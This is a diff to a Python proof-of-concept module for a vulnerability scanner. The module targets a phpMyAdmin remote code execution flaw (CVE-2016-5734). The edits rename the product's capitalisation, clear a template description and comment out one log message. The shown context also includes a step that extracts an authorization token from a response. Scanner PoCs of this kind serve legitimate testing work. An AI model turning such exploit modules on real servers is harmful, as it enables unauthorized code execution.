@@ -5,18 +5,18 @@ from CScanPoc.thirdparty import requests
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 
 class Vuln(ABVuln):
-    vuln_id = 'PhpMyAdmin_0102' # 平台漏洞编号
-    name = 'PhpMyAdmin authorized user RCE' # 漏洞名称
+    vuln_id = 'PHPMyAdmin_0102' # 平台漏洞编号
+    name = 'PHPMyAdmin authorized user RCE' # 漏洞名称
     level = VulnLevel.MED # 漏洞危害级别
     type = VulnType.RCE # 漏洞类型
     disclosure_date = 'Unknown'  # 漏洞公布时间
-    desc = '''模版漏洞描述
+    desc = '''
     Working only at PHP 4.3.0-5.4.6 versions, because of regex break with null byte fixed in PHP 5.4.7.
     ''' # 漏洞描述
     ref = 'https://github.com/coffeehb/Some-PoC-oR-ExP/blob/master/PhpMyAdmin/phpmyadmin4.6.2_RCE.py' # 漏洞来源
     cnvd_id = 'Unknown' # cnvd漏洞编号
     cve_id = 'CVE-2016-5734'  # cve编号
-    product = 'PhpMyAdmin'  # 漏洞组件名称
+    product = 'PHPMyAdmin'  # 漏洞组件名称
     product_version = '4.3.0 - 4.6.2'  # 漏洞应用版本
 
 class Poc(ABPoc):
@@ -57,7 +57,7 @@ class Poc(ABPoc):
                 token_place = resp.text.find("token=") + 6
                 token = resp.text[token_place:token_place + 32]
             if token is False:
-                self.output.info("Cannot get valid authorization token.")
+                # self.output.info("Cannot get valid authorization token.")
                 sys.exit(1)
 
             if custom_table is False:
